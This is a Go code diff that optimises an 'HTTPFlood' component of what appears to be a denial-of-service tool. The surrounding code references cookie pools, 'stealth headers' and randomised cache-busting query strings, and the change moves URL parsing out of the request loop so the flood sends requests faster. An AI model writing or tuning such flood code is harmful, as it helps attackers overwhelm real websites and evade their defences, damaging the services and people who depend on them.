@@ -72,6 +72,12 @@ func generateCookiePool(size int) []string {
 }
 
 func (h *HTTPFlood) Execute(ctx context.Context, target Target) error {
+	// Parse URL once at the start of execution (Performance optimization)
+	parsedURL, err := url.Parse(target.URL)
+	if err != nil {
+		return fmt.Errorf("failed to parse target URL: %w", err)
+	}
+
 	for i := 0; i < h.requestsPerConn; i++ {
 		select {
 		case <-ctx.Done():
@@ -79,14 +85,14 @@ func (h *HTTPFlood) Execute(ctx context.Context, target Target) error {
 		default:
 		}
 
-		if err := h.sendRequest(ctx, target); err != nil {
+		if err := h.sendRequest(ctx, target, parsedURL); err != nil {
 			return err
 		}
 	}
 	return nil
 }
 
-func (h *HTTPFlood) sendRequest(ctx context.Context, target Target) error {
+func (h *HTTPFlood) sendRequest(ctx context.Context, target Target, parsedURL *url.URL) error {
 	reqCtx, cancel := context.WithTimeout(ctx, h.timeout)
 	defer cancel()
 
@@ -98,7 +104,7 @@ func (h *HTTPFlood) sendRequest(ctx context.Context, target Target) error {
 
 	var targetURL string
 	if h.randomizePath {
-		targetURL = h.generateRealisticURL(target.URL)
+		targetURL = h.generateRealisticURL(parsedURL)
 	} else {
 		targetURL = fmt.Sprintf("%s?r=%d&cb=%d", target.URL, rand.Intn(100000000), rand.Intn(1000000))
 	}
@@ -199,12 +205,10 @@ func (h *HTTPFlood) applyStealthHeaders(req *http.Request) {
 }
 
 // generateRealisticURL creates a URL with realistic query parameters
-func (h *HTTPFlood) generateRealisticURL(baseURL string) string {
-	u, err := url.Parse(baseURL)
-	if err != nil {
-		return fmt.Sprintf("%s?r=%d", baseURL, rand.Intn(100000000))
-	}
-
+// Uses pre-parsed URL to avoid repeated parsing overhead
+func (h *HTTPFlood) generateRealisticURL(baseURL *url.URL) string {
+	// Create a shallow copy to avoid mutating the original
+	u := *baseURL
 	q := u.Query()
 
 	q.Set("_", fmt.Sprintf("%d", time.Now().UnixMilli()))
